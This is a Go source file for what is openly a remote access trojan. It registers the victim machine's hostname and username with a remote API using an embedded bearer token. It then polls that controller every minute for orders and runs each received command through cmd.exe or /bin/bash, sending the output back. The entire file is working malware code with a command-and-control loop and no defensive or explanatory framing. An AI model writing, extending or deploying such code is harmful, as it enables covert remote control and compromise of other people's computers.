package main

import (
	"agent/subprocess"
	"api"
	_ "embed"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

//go:embed bearer.txt
var bearer string

func main() {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	username := user.Username
	data := api.OnboardData{hostname, username}

	//Generate the uniq Id
	ratId := api.FNV1A(hostname + username)[0:8]

	log.Println("write : ", ratId, data)
	api.WriteOnboard(bearer, ratId, &data)

	//Callback definition
	callbacks := map[string]func(*api.RPCRequest) api.RPCReturn{
		"execute": func(r *api.RPCRequest) api.RPCReturn {
			log.Print(strings.Join(r.Parameters, " "))
			var cmd *subprocess.Cmd
			if runtime.GOOS == "windows" {
				r.Parameters = append([]string{"/c"}, r.Parameters...)
				// can be replaced by powershell.exe ou vbscripts.exe
				cmd, _ = subprocess.ExecCommand("cmd.exe", r.Parameters...)
			} else {
				r.Parameters = append([]string{"-c"}, r.Parameters...)
				cmd, _ = subprocess.ExecCommand("/bin/bash", r.Parameters...)
			}
			response := cmd.Run()
			log.Print(response.StdOut, response.StdErr, response.ExitCode)
			return api.RPCReturn{response.StdOut, response.StdErr, response.ExitCode}
		},
	}

	//Main loop
	for true {
		log.Println("Checking for orders", ratId, time.Now())

		api.ProcessRPCRequest(bearer, ratId, callbacks)
		time.Sleep(time.Minute)
	}
}
